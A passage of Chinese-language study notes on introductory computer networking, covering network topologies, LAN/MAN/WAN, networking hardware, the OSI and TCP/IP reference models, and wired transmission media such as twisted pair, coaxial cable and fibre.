href="#发展中的网络种类" class="headerlink" title="发展中的网络种类"></a>发展中的网络种类</h3><p>传统通信方式：电路交换</p><p>新型的通信方式：分组交换</p><p>面向终端的网络：以单个计算机为中心的远程联机系统也称为面向终端的计算机通信网，或称它为第一代计算机网络。</p><p><img src="/../image/image-20240915194938932.png" alt="image-20240915194938932"></p><p>面向通信的网络：网络上的通信处理任务由称为通信控制处理机CCP(CommunicationControlProcessor)来承担，各CCP之间构成的通信子网为资源子网提供信息传输服务网络上的主机专门负责数据处理，主机和终端构成了资源子网，以通信子网为中心的计算机网络，通常称其为第二代计算机网络。</p><p><img src="/../image/image-20240915195007190.png" alt="image-20240915195007190"></p><p>标准化的网络：OSI参考模型OSI&#x2F;RM(Open计算机互连要求计算机网络体系必须标准化。（System Interconnection&#x2F;Reference Model)，或简称OSl。</p><p>目前已被国际社会所普遍接受，成是新一代计算机网络体系结构的基础。人们将符合国际标准化的计算机网络称为第三代计算机网络。</p><h2 id="计算机网络的概念和分类"><a href="#计算机网络的概念和分类" class="headerlink" title="计算机网络的概念和分类"></a>计算机网络的概念和分类</h2><h3 id="计算机网络的概念"><a href="#计算机网络的概念" class="headerlink" title="计算机网络的概念"></a>计算机网络的概念</h3><p>定义：计算机网络是利用通信设备和通信线路将地理位置不同，功能独立的多个计算机系统互相连接起来，以功能完善的<strong>网络软件</strong>(包括网络通信协议、网络操作系统等)实现网络中<strong>资源共享</strong>和<strong>信息传递</strong>的系统。</p><p>功能：</p><ol><li>可实现资源共享</li><li>提高了系统的可靠性</li><li>有利于均衡负荷</li><li>提供了非常灵活的工作环境</li><li>性能价格比高、扩充灵活、通信手段多</li></ol><h3 id="计算机网络的分类"><a href="#计算机网络的分类" class="headerlink" title="计算机网络的分类"></a>计算机网络的分类</h3><h4 id="按网络的拓朴结构进行分类"><a href="#按网络的拓朴结构进行分类" class="headerlink" title="按网络的拓朴结构进行分类"></a>按网络的拓朴结构进行分类</h4><p>按网络的拓朴结构进行分类:可分为星型，树型，环型，总线型和网格型等</p><p><img src="/../image/image-20240915195302557.png" alt="image-20240915195302557"></p><p>1、星型结构</p><p>每个节点都有一条单独的线路与中心节点相连。除中心节点外的任何两个节点之间的通信都要经过中心节点，采用集中控制，中心节点就是控制节点。</p><p>优点:简单、容易建网，便于管理</p><p>缺点:由于通信线路总长度较长，成本高;同时对中心节点的可靠性要求高，中心节点出故障将会引起整个网络瘫痪</p><p>2、环型结构</p><p>网络各节点连成环状。数据信息沿一个方向传送，通过各中间节点存储转发最后到达目的节点。</p><p>优点:结构没有路径选择问题，网络管理软件实现简单</p><p>缺点:信息在传输过程中要经过环路上的许多节点，容易因某个节点发生故障而破坏整个网络的通信;另外网络的吞吐能力较差，适用于信息传输量不大的情况，一般用于局域网</p><p>3、网型结构</p><p>这种结构无严格的布局规定和构型，其中一个节点可取道若干路径到达另一个节点</p><p>优点:可靠性高</p><p>缺点:所需通信线路总长度长，投资成本高，路径选择技术较复杂，网络管理软件也比较复杂</p><p>4、树型结构</p><p>网络中各节点按层次进行连接，是一个在分级管理基础上集中式的网络，适合于各种统计管理系统。</p><p>优点:通信线路总长度较短，成本低。</p><p>缺点:任一节点的故障均会影响它所在支路网络的正常工作，而且处于越高层次的节点，其可靠性要求越高。</p><p>5、总线结构</p><p>网中各节点连在一条总线(电缆)上。任一时刻，只允许一个节点占用总线，且只能由该节点发送信息，其它节点处于封锁发送状态，但允许接收。</p><p>优点:网络中任何一节点的故障都不会使整个网络故障，相对而言容易扩展</p><p>缺点:故障管理困难，不利于网络业务量的增加。</p><h4 id="按网络的覆盖范围进行分类"><a href="#按网络的覆盖范围进行分类" class="headerlink" title="按网络的覆盖范围进行分类"></a>按网络的覆盖范围进行分类</h4><p>按网络的覆盖范围进行分类:可分为广域网、局域网和城域网。</p><p>局域网:传输距离有限，传输速度较高，以共享网络资源为目的的网络系统</p><p>城域网:规模介于局域网和广域网之间的一种较大范围的高速网络</p><p>广域网:覆盖范围广、传输速率相对低，以数据通信为主要目的的数据通信网</p><p>互联网(Internet)</p><h5 id="局域网"><a href="#局域网" class="headerlink" title="局域网"></a>局域网</h5><p>局域网是 范围有限且行政可控的网络，特点是连接速率高，</p><p>局域网有以下两种分类标准:</p><p>传输介质：以太网(Ethernet)、光纤分布式数据接口网(FDDI)令牌网(Token Ring)、异步传输模式网(ATM)等</p><p>连接方式：总线型、环型、星型、树型(层次型)、全网状型</p><h6 id="局域网-全网状型"><a href="#局域网-全网状型" class="headerlink" title="局域网-全网状型"></a>局域网-全网状型</h6><p>优点:容错性强</p><p>缺点:扩展性差(不利于增删节点)、建设成本高、邻接关系复杂路径控制难度高(n[n-1]&#x2F;2)、</p><p><img src="/../image/image-20240915200005650.png" alt="image-20240915200005650"></p><h6 id="局域网-总线型"><a href="#局域网-总线型" class="headerlink" title="局域网-总线型"></a>局域网-总线型</h6><p>优点:结构简单、资源共享能力强、节点的增删比较方便</p><p>缺点:容错性差(主要针对总线)、电气信号干扰较大(容易发生数据冲突)不利于故障隔离</p><p><img src="/../image/image-20240915200032335.png" alt="image-20240915200032335"></p><h6 id="局域网-环状"><a href="#局域网-环状" class="headerlink" title="局域网-环状"></a>局域网-环状</h6><p>优点:结构简单、建设成本低</p><p>缺点:容错性差(主要针对节点)、扩展性差(不利于增删节点)、不利于故障<br>隔离</p><p><img src="/../image/image-20240915200055710.png" alt="image-20240915200055710"></p><h6 id="局域网-星型"><a href="#局域网-星型" class="headerlink" title="局域网-星型"></a>局域网-星型</h6><p>优点:扩展性强(节点的增删比较方便)、便于故障隔离</p><p>缺点:容错性差(主要针对中心节点)、中心节点负荷重、链路利用率低</p><p><img src="/../image/image-20240915200119026.png" alt="image-20240915200119026"></p><h6 id="局域网-树型"><a href="#局域网-树型" class="headerlink" title="局域网-树型"></a>局域网-树型</h6><p>优点:扩展性强(节点的增删比较方便)、层次分明</p><p>缺点:结构复杂、容错性差(主要针对次级节点)</p><p><img src="/../image/image-20240915200142369.png" alt="image-20240915200142369"></p><h5 id="城域网"><a href="#城域网" class="headerlink" title="城域网"></a>城域网</h5><p><img src="/../image/image-20240915200202639.png" alt="image-20240915200202639"></p><p><img src="/../image/image-20240915200210887.png" alt="image-20240915200210887"></p><h5 id="广域网"><a href="#广域网" class="headerlink" title="广域网"></a>广域网</h5><p>广域网，又称外网或公网，用于连接不同地区的局域网或城域网</p><p><img src="/../image/image-20240915200336504.png" alt="image-20240915200336504"></p><p>局域网和广域网之间的区别</p><table><thead><tr><th align="center"></th><th align="center">局域网</th><th align="center">广域网</th></tr></thead><tbody><tr><td align="center">传输距离</td><td align="center">通常一般不远于几公里的距离</td><td align="center">长距离传输</td></tr><tr><td align="center">传输速度</td><td align="center">快</td><td align="center">慢</td></tr><tr><td align="center">管理方</td><td align="center">部署局域网的企业</td><td align="center">提供广域网的运营商</td></tr></tbody></table><h5 id="互联网"><a href="#互联网" class="headerlink" title="互联网"></a>互联网</h5><p>互联的网络(internet)：“i”小写时，表示多个网络连接在一起所构成的一个大网络</p><p>互联网(Internet)的特点：</p><ol><li>不隶属于任何人或机构</li><li>不是一个单一的网络，而是大量异构网络的集合</li><li>任何人都可以连接到互联网中</li><li>连接到互联网的方式多种多样</li><li>Internet也可以因其发音称为因特网</li></ol><h2 id="计算机网络的硬件和软件"><a href="#计算机网络的硬件和软件" class="headerlink" title="计算机网络的硬件和软件"></a>计算机网络的硬件和软件</h2><h3 id="计算机网络硬件组成"><a href="#计算机网络硬件组成" class="headerlink" title="计算机网络硬件组成"></a>计算机网络硬件组成</h3><h4 id="网卡"><a href="#网卡" class="headerlink" title="网卡"></a>网卡</h4><p>网卡又名网络适配器(Network Interface Card，NIC)，是计算机和网络线缆之间的物理接口。任何计算机要想连入网络都必须通过网卡。</p><p>网卡的作用:将计算机要发送的数据变换成数据包，转换成串行的光信号或电信号送至网线上传输;同样把网线上传过来的信号转换成并行的数字信号，提供给计算机 。</p><p>网卡的功能:并行数据和串行信号之间的转换、数据包的装配与拆装、网络访问控制和数据缓冲等。</p><h4 id="网线"><a href="#网线" class="headerlink" title="网线"></a>网线</h4><p>计算机网络中用于连接计算机和通信设备之间的通信线路有很多种类，常用的有双绞线和光纤两种。</p><p>双绞线：双绞线简单易用，造价低廉，一般用于局域网或计算机之间少于100m的连接。</p><p>光纤：一般用于传输速率高，传输信息量大的计算机网络。光纤的传输质量好、速度快，但造价和维护费用贵:</p><h4 id="集线器"><a href="#集线器" class="headerlink" title="集线器"></a>集线器</h4><p>主要功能:对接收到的信号进行再生整形放大，以延长网络的传输距离，同时把所有计算机终端集中在以它为中心的节点上。</p><p>集线器工作在网络最底层，不具备任何智能，它只是简单地把电信号放大，然后转发给所有接口。集线器一般只用于局域网。</p><h4 id="调制解调器"><a href="#调制解调器" class="headerlink" title="调制解调器"></a>调制解调器</h4><p>调制解调器(Modem)是计算机与电话线之间进行信号转换的装置，它完成计算机的<strong>数字信号</strong>与电话线的<strong>模拟信号</strong>之间的互相转换。使用调制解调器可以使计算机接入电话线，并利用电话线接入因特网。</p><h4 id="交换机"><a href="#交换机" class="headerlink" title="交换机"></a>交换机</h4><p>交换机是一个拥有智能和学习能力的设备。它可以学习掌握网络的结构及与它相连计算机的相关信息，并且可以对接收到的数据进行过滤，再将数据包送至与目的主机相连接的接口。用交换机可组建局域网或者把两个网络连接起来</p><h4 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a>路由器</h4><p>路由器(Router)为网络中数据选择路由和转发数据，是计算机网络的核心设备相当于高速公路中的立交桥。路由器可以连接多个网络或网段，并对不同网络或网段之间的数据信息进行“翻译”，使它们能够相互“读”懂对方的数据。</p><p>路由器提供<strong>分组过滤</strong>、<strong>分组转发</strong>、<strong>优先级</strong>、<strong>复用</strong>、加密、压缩和<strong>防火墙</strong>等功能并且可以进行性能管理、容错管理和流量控制。</p><h4 id="服务器"><a href="#服务器" class="headerlink" title="服务器"></a>服务器</h4><p>在计算机网络中专门用于为其他计算机提供服务的计算机叫做服务器。服务器就是一台运行了服务进程的计算机。服务器是计算机网络中一个重要的成员。如我们上网浏览的网页就来源于WWW服务器</p><h4 id="计算机网络终端"><a href="#计算机网络终端" class="headerlink" title="计算机网络终端"></a>计算机网络终端</h4><p>一般计算机网络的终端指的是一台独立的计算机。但随着硬件技术的飞速发展已经有很多终端虽然不是计算机，但有了智能，比如手机。</p><p>未来“终端”和“独立的计算机”可能会逐渐失去严格的界限，很可能会有许多的智能设备出现在未来的计算机网络中。</p><p><img src="/../image/image-20240915202954422.png" alt="image-20240915202954422"></p><h3 id="计算机网络软件组成"><a href="#计算机网络软件组成" class="headerlink" title="计算机网络软件组成"></a>计算机网络软件组成</h3><p>计算机网络软件是用来驾驭和管理计算机网络硬件资源的，使得用户能够有效地利用计算机网络的资源。</p><p>在计算机网络软件中，<strong>网络协议</strong>是网络软件系统中最重要的内容，有了网络协议的支持才有网络操作系统和其他网络应用软件。</p><h4 id="1、网络协议"><a href="#1、网络协议" class="headerlink" title="1、网络协议"></a>1、网络协议</h4><p>协议:通信双方为了实现通信而设计的约定或对话规则</p><p>网络协议:网络中的计算机为了相互通信和交流而约定的规则。</p><h4 id="2、网络操作系统"><a href="#2、网络操作系统" class="headerlink" title="2、网络操作系统"></a>2、网络操作系统</h4><p>网络操作系统负责管理整个网络资源，是计算机网络的心脏。</p><p>网络操作系统一般是在计算机单机操作系统的基础上建立起来的，加入了强大的网络功能。如Windows操作系统家族里有单机版的操作系统WindowsXPHome Edition，也有网络操作系统Windows 2003 Server等</p><p>功能：支持多任务、支持大内存、支持对称多处理、支持网络负载平衡、支持远程管理</p><p>局域网的组建模式通常有对等网络和客户机&#x2F;服务器网络两种。</p><p>客户机和服务器网络是目前组网的标准模型。</p><p>客户机&#x2F;服务器网络操作系统由客户机操作系统和服务器操作系统两部分组成。</p><p>客户机操作系统 的功能是让用户能够使用本地资源，处理本地的命令和应用程序，实现客户机与服务器的通信。</p><p>服务器操作系统 的功能是管理服务器和网络中的各种资源，实现服务器与客户机的通信，提供网络服务和网络安全管理。</p><h5 id="常见的网络操作系统："><a href="#常见的网络操作系统：" class="headerlink" title="常见的网络操作系统："></a>常见的网络操作系统：</h5><p>Windows操作系统</p><p>UNIX操作系统:UNIX操作系统是在麻省理工学院开发的一种分时操作系统的基础上发展起来的网络操作系统，是目前功能最强、安全性和稳定性最高的网络操作系统，是一个多用户、多任务的实时操作系统。</p><p>Linux操作系统:Linux操作系统是芬兰赫尔辛基大学的学生LinuxTorvalds开发的具有UNIX操作系统特征的新一代网络操作系统，最大特征是源代码是向用户完全公开的，任何一个用户都可根据自己的需要修改Linux操作系统的内核，所以发展速度非常迅猛。</p><h4 id="3、其它网络软件"><a href="#3、其它网络软件" class="headerlink" title="3、其它网络软件"></a>3、其它网络软件</h4><ol><li>即时通讯类软件:如腾讯QQ，微软MSN，网易POPO，新浪UC等。</li><li>Web浏览器:Internet Explorer，Mozilla Firefox，Tencent Traveler(腾讯TT)等</li><li>杀毒软件:诺顿、卡巴斯基、瑞星、江W民、金山毒霸等。</li><li>网络播放器:暴风影音、千千静听等。</li><li>网络下载工具:迅雷(Thunder)、BitComet(BT)、酷狗(KuGoo)等。</li></ol><h4 id="4、通信的规则"><a href="#4、通信的规则" class="headerlink" title="4、通信的规则"></a>4、通信的规则</h4><p>实现数据通信的几个问题</p><ul><li><p>问题1:如何将不同表现形式的数据放到媒介中传输?</p><p>将数据转换为二进制编码进行存储和传输</p><p><img src="/../image/image-20240915203549276.png" alt="image-20240915203549276"></p></li><li><p>问题2:如何确保数据被发送给正确的接收方?</p><ul><li><p>本质是解决数据在通信过程中的寻址问题</p></li><li><p>每个通信系统的参与者必须满足以下两个条件</p><ul><li><p>拥有某种地址信息来标识自己的物理位置:</p></li><li><p>拥有某种身份识别信息来标识该设备本身</p></li></ul></li><li><p>IP地址即为标识设备位置而定义的<strong>逻辑地址</strong>。</p></li></ul></li><li><p>问题3:如何确保数据有序、高效、可靠的到达接收方?</p><ul><li>如何实现有序:包交换网络允许存在后发先至的情况</li><li>如何实现高效、可靠:需要一种机制来权衡二者的关系:<ul><li>在尽可能短的时间内完成数据的收发</li><li>根据接收情况实时调整数据的发送速率</li></ul></li></ul></li></ul><h4 id="网络协议的作用"><a href="#网络协议的作用" class="headerlink" title="网络协议的作用"></a>网络协议的作用</h4><p>例一:给出一组十进制数，观察定义标准前后的区别。</p><ul><li>未定义输出标准的场景</li></ul><p><img src="/../image/image-20240915203907432.png" alt="image-20240915203907432"></p><ul><li>定义了输出标准的场景:</li></ul><p><img src="/../image/image-20240915203846851.png" alt="image-20240915203846851"></p><p>区分协议、功能&#x2F;服务</p><table><thead><tr><th></th><th>与通信系统的关系</th><th>通信系统的固有属性</th><th>本质</th></tr></thead><tbody><tr><td>协议</td><td>对通信系统之间的操作提供规范</td><td>❌</td><td>规范化操作的框架</td></tr><tr><td>功能</td><td>通信系统最终所希望产生的效果</td><td>✔</td><td>规范化操作的目的</td></tr></tbody></table><p>通信系统双方通过遵循某个协议可以让整个通信系统产生既定的效果，但协议本身不会赋予或者剥夺任何通信系统方的功能。</p><h4 id="协议栈的必要性"><a href="#协议栈的必要性" class="headerlink" title="协议栈的必要性"></a>协议栈的必要性</h4><p>在例一中，制定协议(标准)使得Bob可以成功输出数据:</p><p>对于一个完整的通信系统，单一的协议是否足够?</p><p>例二:给出另一组十进制数“1005 1405 19010919 160119</p><p><img src="/../image/image-20240915204304098.png" alt="image-20240915204304098"></p><p>对比例一和例二:</p><p><img src="/../image/image-20240915204327119.png" alt="image-20240915204327119"></p><p>例一中输出成功的原因是默认使用中文格式输出;</p><p>无论例一还是例二，对协议的制定都是不严谨的，</p><p>标准流程</p><p><img src="/../image/image-20240915204351884.png" alt="image-20240915204351884"></p><p>对于一个复杂的通信系统，通常具备以下特点</p><ul><li>数据的表现形式繁多</li><li>传输介质类型不尽相同</li><li>涉及的操作流程繁琐</li></ul><p>因此，需要为每个通信系统制定一个分层的框架，以实现</p><ul><li>为特定的操作提供规范化的标准(协议)</li><li>不同的协议在内容上不会相互重复或冲突</li></ul><h2 id="计算机网络体系结构"><a href="#计算机网络体系结构" class="headerlink" title="计算机网络体系结构"></a>计算机网络体系结构</h2><h4 id="网络体系结构"><a href="#网络体系结构" class="headerlink" title="网络体系结构"></a>网络体系结构</h4><p>计算机网络体系结构是计算机网络及其部件所应完成的<strong>功能的精确定义</strong>。网络体系结构通常应包括以下内容:网络功能部件的定义及相互关系的描述、网络与用户之间的接口定义。</p><h5 id="网络体系结构的三要素"><a href="#网络体系结构的三要素" class="headerlink" title="网络体系结构的三要素"></a>网络体系结构的三要素</h5><p>网络体系结构&#x3D;{<strong>层，协议，接口</strong>}</p><ul><li>层:能提供某种或某一类服务功能集合的逻辑构造</li><li>协议:为完成该层对等实体之间通信所必须遵循的规则或标准</li><li>接口:两个相邻协议层之间交换信息的连接点</li></ul><p><img src="/../image/image-20240915210111952.png" alt="image-20240915210111952"></p><h5 id="常见的网络体系结构"><a href="#常见的网络体系结构" class="headerlink" title="常见的网络体系结构"></a>常见的网络体系结构</h5><ul><li>DEC公司的DNA(DigitalNetwork Architecture)</li><li>IBM公司的SNA(SystemNetwork Architecture)</li><li>因特网的TCP&#x2F;IP</li><li>国际标准化组织ISO的OSI参考模型</li></ul><p>网络体系结构是一种分层的<strong>层次式结构。</strong></p><h5 id="分层原理"><a href="#分层原理" class="headerlink" title="分层原理"></a>分层原理</h5><ul><li>分层的原因:复杂的问题分而治之，逐个解决。</li><li>分层的思想:每一层都在它的下层服务的基础上提供更高级的增值服务，最高层提供能运行应用程序的服务。</li><li>分层的好处:使每一层实现一种相对独立的功能。每一层不必知道下面一层是如何实现的，只要知道下层通过层间接口提供的服务是什么及本层向上层提供什么样的服务，就能独立地设计。</li></ul><p>在分层结构中，n层是n-1层的用户，又是n+1层的服务提供者。n+1层虽然只直接使用了n层提供的服务，实际上它通过n层间接使用了n-1层以及以下所有各层的服务。</p><p><img src="/../image/image-20240915210504875.png" alt="image-20240915210504875"></p><h5 id="分层的原则"><a href="#分层的原则" class="headerlink" title="分层的原则"></a>分层的原则</h5><ul><li>当需要一个不同抽象体时，应该单独创建一层</li><li>每一层都应该执行一个明确定义的功能选</li><li>择每一层功能时，应考虑到定义国际标准化的协议</li><li>选择层的边界时，应使通过接口的信息量最少</li><li>层数应该足够多，以保证不同的功能不会被混在一层中</li><li>层数也不能太多，以免体系结构变得过于庞大</li></ul><h6 id="网络协议"><a href="#网络协议" class="headerlink" title="网络协议"></a>网络协议</h6><p>网络协议是指通信双方在通信时所应遵循的一组规则、标准或约定。协议由语义、语法、定时三部分组成。</p><ul><li>语义(Semantics):规定通信双方准备“讲什么”，涉及用于协调与差错处理的控制信息</li><li>语法(Syntax):规定通信双方“如何讲”涉及数据及控制信息的格式、编码及信号电平等</li><li>定时(Timing):涉及速度匹配和排序等</li></ul><h4 id="OSI参考模型"><a href="#OSI参考模型" class="headerlink" title="OSI参考模型"></a>OSI参考模型</h4><p>国际标准化组织lSO(International Organization for Standardization)于1979年12月公布了开放式系统互连参考模型OSI&#x2F;RM(Reference ModelofOpen System Interconnection)</p><p>“开放”是指按OSI标准建立的系统可以和世界上任意一个也按OSI标准建立起来的系统相互进行通信。</p><p>第1层到第3层主要负责通信功能，一般称为通信子网层。第5层到第7层属于资源子网的功能范畴，称为资源子网层。传输层起着衔接上下三层的作用。</p><p><img src="/../image/image-20240915214259456.png" alt="image-20240915214259456"></p><h5 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h5><p>物理层是OSI参考模型的最底层。物理层为通信提供物理链路，实现比特流(bit)的透明传输。物理层的作用是要尽可能地屏蔽掉不同物理设备和传输媒体的差异，使其上面的数据链路层感觉不到这些差异。</p><p>物理层定义了四个重要特性:机械特性、电气特性、功能特性和规程特性，以便建立、维护和拆除物理链接。</p><h5 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h5><p>数据链路层是在物理层提供的比特流服务基础上，建立相邻结点间的数据链路，传输按一定格式组织起来的数据帧</p><ul><li>作用:通过数据链路层协议，在不太可靠的物理链路上实现可靠的数据传送</li><li>主要功能:链路管理、帧的装配与分解、帧同步、流量控制、差错控制、将数据和控制信息区分开、透明传输、寻址等</li><li>数据链路层提供了网络中相邻结点间透明的、可靠的信息传输</li></ul><h5 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h5><p>功能:提供源站到目标站的信息传输服务，负责由一个站到另一个站点的路径选择。网络层在通信子网中传输信息包或报文分组</p><p>网络层为了向传输层提供整个网络上任意两个结点之间数据传输通路需要解决建立、维护以及结束两个站点之间的联系和由此而引起的路径选择、流量控制、阻塞和死锁等问题</p><h5 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h5><p>传输层的作用是为不同系统内的会话实体建立端到端的连接，执行端到端的差错、顺序和流量控制，数据传输的基本单位是<strong>报文</strong>。</p><ul><li>传输层将源主机与目标主机直接以点到点方式连接起来，把从源主机接收来的报文正确地传送到目的主机，是资源子网与通信子网的接口层</li><li>传输层的服务可以提供一条无差错按顺序的端到端连接，也可以提供不保证顺序地独立报文传输，或多目标报文广播。</li></ul><h5 id="会话层"><a href="#会话层" class="headerlink" title="会话层"></a>会话层</h5><p>会话层也称为会晤层或对话层。它是在两个表示实体之间建立起通信伙伴关系向表示层提供对话服务，并对通信的过程进行管理和协调</p><h5 id="表示层"><a href="#表示层" class="headerlink" title="表示层"></a>表示层</h5><p>表示层负责数据的表示方式，解决格式和数据表示问题</p><h5 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h5><p>在OSI环境下为用户提供各种网络服务</p><p><img src="/../image/image-20240915214530425.png" alt="image-20240915214530425"></p><h4 id="TCP-x2F-IP参考模型"><a href="#TCP-x2F-IP参考模型" class="headerlink" title="TCP&#x2F;IP参考模型"></a>TCP&#x2F;IP参考模型</h4><p>TCP&#x2F;lP(Transmission Control Protocol &#x2F;Internet Protocol)协议是定义所有的数据传输如何在Internet上进行交换的一个协议集合或一组协议簇</p><ul><li>这一系列协议是按其中最重要、应用最广泛的两个协议TCP与IP来命名的。</li><li>目前TCP&#x2F;IP已成为一个事实上的工业标准。</li></ul><h5 id="TCP-x2F-IP主要功能"><a href="#TCP-x2F-IP主要功能" class="headerlink" title="TCP&#x2F;IP主要功能"></a>TCP&#x2F;IP主要功能</h5><p>TCP是传输控制协议，规定了一种可靠的数据信息传递服务;IP协议又称为互联网协议，提供网络之间连接的完善功能。</p><h5 id="TCP-x2F-IP主要特点"><a href="#TCP-x2F-IP主要特点" class="headerlink" title="TCP&#x2F;IP主要特点"></a>TCP&#x2F;IP主要特点</h5><ol><li>与生产厂家无关</li><li>已经在各种计算机上实现</li><li>已被LAN和WAN采用</li><li>被许多政府部门和商业机构采用</li></ol><h5 id="TCP-x2F-IP体系结构"><a href="#TCP-x2F-IP体系结构" class="headerlink" title="TCP&#x2F;IP体系结构"></a>TCP&#x2F;IP体系结构</h5><p>TCP&#x2F;IP是一个四层的结构</p><p>目前TCP&#x2F;IP已在各种计算机和网络设备中上实现</p><p><img src="/../image/image-20240915214636857.png" alt="image-20240915214636857"></p><h5 id="应用层-1"><a href="#应用层-1" class="headerlink" title="应用层"></a>应用层</h5><p>向用户提供一组常用、可以在TCP&#x2F;IP因特网上获得服务的应用程序</p><h5 id="传输层-1"><a href="#传输层-1" class="headerlink" title="传输层"></a>传输层</h5><p>提供应用程序间的通信，即端到端的通信。其功能包括:第一、格式化的信息流:第二、提供可靠传输，保证数据无误有序地到达。</p><h5 id="因特网层"><a href="#因特网层" class="headerlink" title="因特网层"></a>因特网层</h5><p>负责相邻计算机之间的通信。其功能包括:处理来自传输层的分组发送请求:处理输入数据报;用因特网控制报文协议ICMP处理路径、流量控制、拥塞等问题。</p><h5 id="网络接口层"><a href="#网络接口层" class="headerlink" title="网络接口层"></a>网络接口层</h5><p>又称为通信层，?负责接收IP数据报并通过网络发送之。或从网络上接收物理帧抽出IP数据报，交给IP层。</p><h5 id="沙漏计时器形状的TCP-x2F-IP协议族"><a href="#沙漏计时器形状的TCP-x2F-IP协议族" class="headerlink" title="沙漏计时器形状的TCP&#x2F;IP协议族"></a>沙漏计时器形状的TCP&#x2F;IP协议族</h5><p>TCP&#x2F;IP协议族的特点是“两头大，中间小务，这样可以为各式各样的应用提供服，同时也可以连接到各式各样的网络上。</p><p><img src="/../image/image-20240915214753501.png" alt="image-20240915214753501"></p><h5 id="OSI与TCP-x2F-IP的比较"><a href="#OSI与TCP-x2F-IP的比较" class="headerlink" title="OSI与TCP&#x2F;IP的比较"></a>OSI与TCP&#x2F;IP的比较</h5><p><img src="/../image/image-20240915214824939.png" alt="image-20240915214824939"></p><ol><li>两者都是以<strong>协议栈</strong>的概念为基础，并且协议栈中的协议彼此相互独立。</li><li>传输层以及传输层以上的各层都为希望通信的进程提供了一种端到端的，<strong>与网络无关</strong>的服务。</li><li>OSI模型中，服务、接口、协议的<strong>概念</strong>非常清晰，而TCP&#x2F;IP模型中并没有明确地区分三者之间的差异。</li><li>TCP&#x2F;IP一开始就考虑到多种异构网的互连问题，并将互联网协议IP作为TCP&#x2F;IP的重要组成部分。而OSI最初只考虑到使用一种标准的公用数据网络将各种不同的系统互联在一起。</li><li>TCP&#x2F;IP一开始就对<strong>面向连接服务和无连接服务</strong>并重，TCP&#x2F;IP的传输层支持面向连接服务和无连接服务，网络层只支持无连接的服务，而OSI的传输层只支持面向连接服务，网络层支持面向连接服务和无连接服务。</li><li>TCP&#x2F;IP有较好的<strong>网络管理功能</strong>，而OSI到后来才开始考虑这个问题</li><li>OSI是先有模型，后有协议，适应范围广，而TCP&#x2F;IP是先有协议，后有模型，因而TCP&#x2F;IP模型的<strong>通用性</strong>较差，很难描述其他种类的协议栈。</li></ol><h5 id="网络体系结构中的数据传递过程"><a href="#网络体系结构中的数据传递过程" class="headerlink" title="网络体系结构中的数据传递过程"></a>网络体系结构中的数据传递过程</h5><p><img src="/../image/image-20240915215035561.png" alt="image-20240915215035561"></p><h2 id="网络传输介质"><a href="#网络传输介质" class="headerlink" title="网络传输介质"></a>网络传输介质</h2><h3 id="有线传输介质"><a href="#有线传输介质" class="headerlink" title="有线传输介质"></a>有线传输介质</h3><h4 id="双绞线"><a href="#双绞线" class="headerlink" title="双绞线"></a>双绞线</h4><p>双绞线电缆是由按一定密度的螺旋结构排列的两根包有绝缘层的铜线部再包裹屏蔽层或橡塑外皮而构成。</p><p>双绞线电缆分为屏蔽双绞线(STP)和非屏蔽双绞线(UTP)两大类。</p><h4 id="为什么叫双绞线"><a href="#为什么叫双绞线" class="headerlink" title="为什么叫双绞线"></a>为什么叫双绞线</h4><p>顾名思义，每两条芯线相互缠绕在一起</p><h4 id="两条芯线相互缠绕在一起的作用是什么"><a href="#两条芯线相互缠绕在一起的作用是什么" class="headerlink" title="两条芯线相互缠绕在一起的作用是什么"></a>两条芯线相互缠绕在一起的作用是什么</h4><p>由两根相互绝缘的导线按照一定规格相互缠绕在一起，可以实现冲抵干扰，降低信号传输衰减的效果</p><p><img src="/../image/image-20240915215458657.png" alt="image-20240915215458657"></p><h5 id="非屏蔽双绞线"><a href="#非屏蔽双绞线" class="headerlink" title="非屏蔽双绞线"></a>非屏蔽双绞线</h5><p><img src="/../image/image-20240915215530316.png" alt="image-20240915215530316"></p><p>优点: 尺寸小、重量轻、容易弯曲;价格便宜;容易安装和维护。</p><p>缺点:抗干扰能力较弱;传输距离比较短</p><p>UTP分为:3类线、4类线、5类线和超5类线,适合于楼宇内部的结构化布线。</p><h5 id="屏蔽双绞线"><a href="#屏蔽双绞线" class="headerlink" title="屏蔽双绞线"></a>屏蔽双绞线</h5><p>优点:传输质量较高;电缆尺寸和重量与UTP相当</p><p>缺点:安装不合适有可能引入外界干扰;成本较高。</p><p><img src="/../image/image-20240915215614213.png" alt="image-20240915215614213"></p><h5 id="目前常用于局域网连接的双绞线缆和以太网速率"><a href="#目前常用于局域网连接的双绞线缆和以太网速率" class="headerlink" title="目前常用于局域网连接的双绞线缆和以太网速率"></a>目前常用于局域网连接的双绞线缆和以太网速率</h5><p><img src="/../image/image-20240915215635743.png" alt="image-20240915215635743"></p><h4 id="同轴电缆"><a href="#同轴电缆" class="headerlink" title="同轴电缆"></a>同轴电缆</h4><p>同轴电缆由两个导体组成，是一个空心圆柱形网状导体围裹着一个实心导体的结构。</p><p>同轴电缆可分为两种基本类型，基带同轴电缆和宽带同轴电缆。</p><p><img src="/../image/image-20240915215702121.png" alt="image-20240915215702121"></p><h5 id="同轴电缆的特性"><a href="#同轴电缆的特性" class="headerlink" title="同轴电缆的特性"></a>同轴电缆的特性</h5><p>物理特性:频率范围较宽。<br>传输特性:</p><ul><li>a.粗电缆:抗干扰性能好，传输距离远</li><li>b.细电缆:价格便宜，传输距离近</li></ul><p>连通性:适于点到点及点到多点的连接。</p><p>地理范围:距离大，几千米甚至几十干米。</p><p>价格:高于双绞线，低于光纤</p><h4 id="光纤"><a href="#光纤" class="headerlink" title="光纤"></a>光纤</h4><p>光纤是一种能够传导光信号的介质。光纤由纤芯、包层两部分构成。纤为光通路;包层由多层反射玻璃纤维构成，用来将光线反射到纤芯上。</p><p><img src="/../image/image-20240915215808335.png" alt="image-20240915215808335"></p><p><img src="/../image/image-20240915215841708.png" alt="image-20240915215841708"></p><p><img src="/../image/image-20240915215854477.png" alt="image-20240915215854477"></p><h5 id="光纤传输方式"><a href="#光纤传输方式" class="headerlink" title="光纤传输方式"></a>光纤传输方式</h5><p>单模和多模</p><p><img src="/../image/image-20240915215922867.png" alt="image-20240915215922867"></p><h5 id="光纤的特性"><a href="#光纤的特性" class="headerlink" 